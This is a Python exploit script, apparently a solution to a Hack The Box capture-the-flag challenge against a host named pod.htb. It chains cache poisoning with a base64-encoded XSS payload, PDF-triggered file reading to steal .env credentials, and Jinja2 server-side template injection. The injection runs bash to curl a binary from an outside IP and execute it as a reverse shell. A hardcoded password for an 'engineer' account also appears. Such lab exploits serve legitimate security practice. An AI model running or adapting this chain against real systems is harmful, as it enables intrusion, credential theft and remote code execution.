#!/usr/bin/python3.11

import requests
import urllib.parse
from urllib.parse import quote_plus
import base64
from time import sleep

# TARGET = "http://pod.htb:1337"
TARGET = "http://pod.htb:47758"

############################################################################################
# Step 1 = Get .env credentials                                                            #
# Step 2 = Insert 'engineer' password and --> drop revbin payload                          #
# Step 3 = Switch rce payload to reverse_shell --> get shell
currentStep = 1                                                                          #
############################################################################################

def poison_cache():
    print("[*] Sending cache poisoning request with browser-like headers...")
    url = f"{TARGET}/stats?period=1m&period={ENCODED_PAYLOAD}"
    r = requests.get(url)
    print(f"[+] Poisoning response: {r.status_code}")
    print(f"[+] Body: {r.text[:200]}...")

def call_for_pdf():
    print("[*] Trigger pdf...")
    url = f"{TARGET}/generate-report"
    r = requests.get(url)
    print(f"[+] Pdf response: {r.status_code}")

def submit_rce_report():
    print("[*] Submitting RCE payload via /report...")
    dropper_payload = {
        "title": "trigger",
        "description": "{% block body %}{% endblock %} {{ dict.__mro__[1].__subclasses__()[337](['bash','-c','curl -s http://139.162.184.70:7001/revbin -o /tmp/revbin && chmod +x /tmp/revbin']) }}",
        "file_path": "/app/services/web/templates/_template.html"
    }

    rev_shell_payload = {
        "title": "trigger",
        "description": "{% block body %}{% endblock %} {{ dict.__mro__[1].__subclasses__()[337](['/tmp/revbin']) }}",
        "file_path": "/app/services/web/templates/_template.html"
    }

    currentPayload = None
    if currentStep == 2:
        currentPayload = dropper_payload
    else:
        currentPayload = rev_shell_payload
    
    auth_header = base64.b64encode(f"{engineer_username}:{engineer_password}".encode()).decode()
    headers = {
        "Authorization": f"Basic {auth_header}",
        "Content-Type": "application/json"
    }
    r = requests.post(f"{TARGET}/report", json=currentPayload, headers=headers)
    print(f"[+] Report submission response: {r.status_code} | {r.text}")
    
    print("[*] Triggering template... Might require multiple calls on step 3")
    sleep(2)
    res = requests.get(f"{TARGET}/")
    
    if (currentStep == 3):
        for _ in range(0, 5):
            try:
                print("[*] Triggering template...")
                res = requests.get(f"{TARGET}/")
            except Exception as e:
                print(f"[!] Error hitting index: {e}")
            sleep(2)

if __name__ == "__main__":
    if currentStep == 1:
        with open("read_file.js", "r") as f:
            b64_js = base64.b64encode(f.read().encode()).decode()

        RAW_PAYLOAD = f'<img src=x onerror=eval(atob("{b64_js}"))>'
        ENCODED_PAYLOAD = quote_plus(RAW_PAYLOAD, safe='()')
        
        poison_cache()
        sleep(2)
        call_for_pdf()
    else:
        engineer_username = "engineer"
        engineer_password = "vFPSikbYzwIXGpRoFP63rO3Eav8ZjNHs"
        submit_rce_report()
